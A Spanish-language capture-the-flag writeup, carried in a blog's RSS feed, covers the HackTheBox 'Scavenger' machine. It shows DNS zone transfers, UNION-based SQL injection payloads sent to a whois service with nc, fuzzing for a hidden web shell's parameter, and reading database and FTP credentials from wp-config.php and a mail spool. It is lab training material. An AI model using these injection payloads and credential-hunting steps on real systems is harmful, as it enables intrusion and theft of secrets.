<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Firtsmiracle blog de Ciberseguridad</title>
    <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sat, 24 Jun 2023 00:43:56 +0000</pubDate>
    <lastBuildDate>Sat, 24 Jun 2023 00:43:56 +0000</lastBuildDate>
    <generator>Jekyll v3.9.0</generator>
    
      <item>
        <title>Maquina Scavenger - htb writeup</title>
        <description>&lt;p&gt;Hola de nuevo el dia de hoy vamos a resolver la máquina &lt;code&gt;Scavenger&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo &lt;code&gt;whois&lt;/code&gt;, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo &lt;code&gt;pcap&lt;/code&gt; para descubrir un &lt;code&gt;rootkit&lt;/code&gt; ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Scavenger
❯ ls
 Scavenger
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.155
PING 10.10.10.155 (10.10.10.155) 56(84) bytes of data.
64 bytes from 10.10.10.155: icmp_seq=1 ttl=63 time=123 ms

--- 10.10.10.155 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 123.005/123.005/123.005/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.155 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:11 GMT
Initiating SYN Stealth Scan at 22:11
Scanning 10.10.10.155 [65535 ports]
Discovered open port 22/tcp on 10.10.10.155
Discovered open port 21/tcp on 10.10.10.155
Discovered open port 80/tcp on 10.10.10.155
Discovered open port 53/tcp on 10.10.10.155
Discovered open port 43/tcp on 10.10.10.155
Completed SYN Stealth Scan at 22:12, 26.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.155
Host is up, received user-set (0.16s latency).
Scanned at 2023-06-23 22:11:41 GMT for 26s
Not shown: 65496 filtered tcp ports (no-response), 32 filtered tcp ports (port-unreach), 2 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
43/tcp open  whois   syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
           Raw packets sent: 131040 (5.766MB) | Rcvd: 39 (2.604KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,22,43,53,80 10.10.10.155 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:12 GMT
Nmap scan report for 10.10.10.155
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
43/tcp open  whois?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open  domain  ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Debian
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.00 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;FTP&lt;/td&gt;
      &lt;td&gt;vsftpd 3.0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.4p1 Debian 10+deb9u4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;43&lt;/td&gt;
      &lt;td&gt;WHOIS&lt;/td&gt;
      &lt;td&gt;whois?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;DNS&lt;/td&gt;
      &lt;td&gt;ISC BIND 9.10.3-P4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.25&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Observamos un servicio web ejecutandose en el puerto &lt;code&gt;80&lt;/code&gt; y en el puerto &lt;code&gt;43&lt;/code&gt; obtenemos un dominio que vamos a proceder a añadir en nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.155 supersechosting.htb www.supersechosting.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora intentamos visualizar el servicio en el navegador se nos muestra un mensaje de que el servicio no esta disponible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora ya que nmap tambien nos reporto que el puerto &lt;code&gt;53&lt;/code&gt; se encuentra abierto asi que con la herramienta &lt;code&gt;dig&lt;/code&gt; vamos a intentar realizar un ataque de transferencia de zona, para poder obtener dominios validos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ dig @10.10.10.155 supersechosting.htb axfr

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.27-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.155 supersechosting.htb axfr
; (1 server found)
;; global options: +cmd
supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
supersechosting.htb.	604800	IN	NS	ns1.supersechosting.htb.
supersechosting.htb.	604800	IN	MX	10 mail1.supersechosting.htb.
supersechosting.htb.	604800	IN	A	10.10.10.155
ftp.supersechosting.htb. 604800	IN	A	10.10.10.155
mail1.supersechosting.htb. 604800 IN	A	10.10.10.155
ns1.supersechosting.htb. 604800	IN	A	10.10.10.155
whois.supersechosting.htb. 604800 IN	A	10.10.10.155
www.supersechosting.htb. 604800	IN	A	10.10.10.155
supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
;; Query time: 436 msec
;; SERVER: 10.10.10.155#53(10.10.10.155)
;; WHEN: Fri Jun 23 22:23:59 GMT 2023
;; XFR size: 10 records (messages 1, bytes 275)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos una lista de subdominios que validaremos, despues de añadirlos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.155 ftp.supersechosting.htb mail1.supersechosting.htb ns1.supersechosting.htb whois.supersechosting.htb www.supersechosting.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Logramos resolver un dominio, el cual nos da información acerca del servicio, como que se esta usando &lt;code&gt;php&lt;/code&gt; y &lt;code&gt;mysql&lt;/code&gt;, ademas tambien podemos ver información acerca de &lt;code&gt;whois&lt;/code&gt; que curiosamente tiene expuesto la maquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al conectarnos a &lt;code&gt;whois&lt;/code&gt; a traves de telnet, vemos que utiliza como base de datos el servicio de &lt;code&gt;mariadb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.155 43
Trying 10.10.10.155...
Connected to 10.10.10.155.
Escape character is '^]'.
 
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object
Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El servicio &lt;code&gt;WHOIS&lt;/code&gt; siempre necesita utilizar una base de datos para almacenar y extraer la información. Por lo tanto, una posible &lt;code&gt;SQLInjection&lt;/code&gt; podría funcionar al consultar la base de datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
'
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''') limit 1' at line 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Mandamos una &lt;code&gt;'&lt;/code&gt; en la consulta y vemos que recibimos un error de &lt;code&gt;sql&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
') ORDER BY 2#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder a enumear la base de datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.155 43
') UNION SELECT database(), 2#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
whois

❯ nc 10.10.10.155 43
') UNION SELECT table_name,2 from information_schema.tables where table_schema='whois'#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
customers

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 0,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
id^C

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 1,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
domain^C

❯ nc 10.10.10.155 43
') UNION SELECT column_name, 2 from information_schema.columns where table_name=&quot;customers&quot; and table_schema=&quot;whois&quot; LIMIT 2,1#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
data

❯ nc 10.10.10.155 43
') UNION SELECT domain, 2 FROM  customers#
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 4 object
supersechosting.htbjustanotherblog.htbpwnhats.htbrentahacker.htb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos mas subdominios y entre ellos uno curioso &lt;code&gt;rentahacker.htb&lt;/code&gt;, que si lo vemos en la pagina web no nos muestra información, pero podemos ejecutar un ataque de transferencia de zona de este subdominio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ dig @10.10.10.155 rentahacker.htb axfr

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.27-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.155 rentahacker.htb axfr
; (1 server found)
;; global options: +cmd
rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
rentahacker.htb.	604800	IN	NS	ns1.supersechosting.htb.
rentahacker.htb.	604800	IN	MX	10 mail1.rentahacker.htb.
rentahacker.htb.	604800	IN	A	10.10.10.155
mail1.rentahacker.htb.	604800	IN	A	10.10.10.155
sec03.rentahacker.htb.	604800	IN	A	10.10.10.155
www.rentahacker.htb.	604800	IN	A	10.10.10.155
rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
;; Query time: 443 msec
;; SERVER: 10.10.10.155#53(10.10.10.155)
;; WHEN: Fri Jun 23 22:49:07 GMT 2023
;; XFR size: 8 records (messages 1, bytes 251)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos dos subdominios nuevos que luego de añadirlos, visualizamos una pagina en &lt;code&gt;sec03.rentahacker.htb&lt;/code&gt; con una imagen en relación a un hacker que ya nos da que pensar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anteriormente en uno de los subdominios vemos que se estaba utilizando como lenguaje a &lt;code&gt;php&lt;/code&gt;, asi que vamos a tratar de buscar archivos con esa extensión con la ayuda de &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sec03.rentahacker.htb/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000015:   302        0 L      0 W        0 Ch        &quot;index&quot;                                                                                                               
000000217:   200        57 L     340 W      4729 Ch     &quot;signup&quot;                                                                                                              
000000027:   302        0 L      0 W        0 Ch        &quot;search&quot;                                                                                                              
000000053:   200        57 L     339 W      4712 Ch     &quot;login&quot;                                                                                                               
000000685:   200        0 L      0 W        0 Ch        &quot;core&quot;                                                                                                                
000000190:   200        57 L     332 W      4667 Ch     &quot;wiki&quot;                                                                                                                
000001688:   200        0 L      0 W        0 Ch        &quot;shell&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos un archivo con un nombre muy descriptivo &lt;code&gt;shell&lt;/code&gt; que curiosamente existe, y quiero pensar que al ser una shell debe ejecutarse a traves de un parametro que si bien no sabemos el nombre, con &lt;code&gt;wfuzz&lt;/code&gt; igualmente podemos tratar de averiguarlo ejecutando un comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &quot;http://sec03.rentahacker.htb/shell.php?FUZZ=whoami&quot;
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000012593:   200        1 L      1 W        8 Ch        &quot;hidden&quot;                                                                                                              
000014350:   200        0 L      0 W        0 Ch        &quot;guildwars&quot;                                                                                                           
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos que el nombre parametro corresponde a &lt;code&gt;hidden&lt;/code&gt; y si lo validamos tenemos ejecución de comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora tratamos de mandarnos una reverse shell a nuestra maquina, vemos que nos resulta imposible debido a que la maquina tiene implementado reglas de firewall. Por ello para poder movernos de manera mas comoda vamos a usar una herramienta que nos permite tener acceso a una &lt;code&gt;tty&lt;/code&gt; sobre http.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py&quot;&gt;https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para usarla simplemente debemos modificar la dirección url y el parametro al que corresponde nuestra shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
whoami
&amp;gt; ib01c03
ls -l /home
&amp;gt; total 24
drwx------ 4 ib01c01 customers 4096 Sep  1  2021 ib01c01
drwx------ 3 ib01c02 customers 4096 Sep  1  2021 ib01c02
drwx------ 4 ib01c03 customers 4096 Sep  1  2021 ib01c03
dr-xrwx--- 3 ib01ftp support   4096 Dec 10  2018 ib01ftp
drwx------ 3 ib01www support   4096 Dec 10  2018 ib01www
drwx------ 2 support support   4096 Sep 13  2022 support
ls -l /home/ib01c03
&amp;gt; total 26576
-rw-r--r--  1 ib01c03 customers 16689687 Oct 17  2018 bugtracker.2.18.tgz
drwxr-xr-x 15 ib01c03 customers    12288 Dec 10  2018 sec03
-rw-r--r--  1 ib01c03 customers 10503584 Dec  6  2018 wordpress.tgz
drwxr-xr-x  5 ib01c03 customers     4096 Sep  1  2021 www
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos un archivo comprimido en &lt;code&gt;wordpress&lt;/code&gt;, asi que podemos tratar de buscar el archivo &lt;code&gt;wp-config.php&lt;/code&gt; que generalmente contiene credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;find / -name wp-config.php 2&amp;gt;/dev/null
&amp;gt; /home/ib01c03/www/wp-config.php
cat /home/ib01c03/www/wp-config.php
&amp;gt; &amp;lt;?php
 The name of the database for WordPress /
define('DB_NAME', 'ib01c03');

 MySQL database username /
define('DB_USER', 'ib01c03');

 MySQL database password /
define('DB_PASSWORD', 'Thi$sh1tIsN0tGut');

 MySQL hostname /
define('DB_HOST', 'localhost');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos unas credenciales validas pero que correspoden al mismo usuario &lt;code&gt;ib01c03&lt;/code&gt;, ahora recordemos que cuando obtuvimos subdominios, se nos reporto uno asociado a &lt;code&gt;mail1.rentahacker.htb&lt;/code&gt;, por ello podemos listar la ruta &lt;code&gt;/var/spool/mail&lt;/code&gt; buscando información.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ls -l /var/spool/mail/*
&amp;gt; -rw-rw-r-- 1 root mail 1274 Dec 10  2018 /var/spool/mail/ib01c03
-rw-rw---- 1 root mail 1043 Dec 11  2018 /var/spool/mail/support
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que existe un correo el cual al leerlo obtenemos las credenciales del usuario &lt;code&gt;ib01ftp:YhgRt56_Ta&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat /var/spool/mail/ib01c03
&amp;gt; From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018
Return-path: &amp;lt;support@ib01.supersechosting.htb&amp;gt;
Envelope-to: ib01c03@ib01.supersechosting.htb
Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100
Received: from support by ib01.supersechosting.htb with local (Exim 4.89)
	(envelope-from &amp;lt;support@ib01.supersechosting.htb&amp;gt;)
	id 1gWRtI-0000ZK-8Q
	for ib01c03@ib01.supersechosting.htb; Mon, 10 Dec 2018 21:10:56 +0100
To: &amp;lt;ib01c03@ib01.supersechosting.htb&amp;gt;
Subject: Re: Please help! Site Defaced!
In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
	&amp;lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&amp;gt;
References: &amp;lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&amp;gt;
X-Mailer: mail (GNU Mailutils 3.1.1)
Message-Id: &amp;lt;E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb&amp;gt;
From: support &amp;lt;support@ib01.supersechosting.htb&amp;gt;
Date: Mon, 10 Dec 2018 21:10:56 +0100
X-IMAPbase: 1544472964 2
Status: O
X-UID: 1

&amp;gt;&amp;gt; Please we need your help. Our site has been defaced!
&amp;gt;&amp;gt; What we should do now?
&amp;gt;&amp;gt;
&amp;gt;&amp;gt; rentahacker.htb

Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
Please check if there is any strange file in your web root and upload it to the ftp server:
ftp.supersechosting.htb
user: ib01ftp
pass: YhgRt56_Ta

Thanks.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como las credenciales estan asociadas a &lt;code&gt;ftp&lt;/code&gt; y el puerto se encuentra abierto probamos a conectarnos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xrwx---    4 1005     1000         4096 Dec 10  2018 incidents
226 Directory send OK.
ftp&amp;gt; cd incidents
250 Directory successfully changed.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xrwx---    2 1005     1000         4096 Jan 30  2019 ib01c01
dr-xrwx---    2 1005     1000         4096 Dec 10  2018 ib01c03
226 Directory send OK.
ftp&amp;gt; cd ib01c01
250 Directory successfully changed.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--rw-r--    1 1005     1000        10427 Dec 10  2018 ib01c01.access.log
-rw-r--r--    1 1000     1000       835084 Dec 10  2018 ib01c01_incident.pcap
-r--rw-r--    1 1005     1000          173 Dec 11  2018 notes.txt
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al conectarnos vemos un archivo log, una nota y un archivo pcap, los cuales vamos a traernos a nuestra maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; binary on
200 Switching to Binary mode.
ftp&amp;gt; prompt off
Interactive mode off.
ftp&amp;gt; mget *
local: ib01c01.access.log remote: ib01c01.access.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ib01c01.access.log (10427 bytes).
226 Transfer complete.
10427 bytes received in 0.45 secs (22.5332 kB/s)
local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
226 Transfer complete.
835084 bytes received in 4.99 secs (163.5452 kB/s)
local: notes.txt remote: notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notes.txt (173 bytes).
226 Transfer complete.
173 bytes received in 0.00 secs (861.9659 kB/s)
&lt;/code&gt;&lt;/pre&gt;

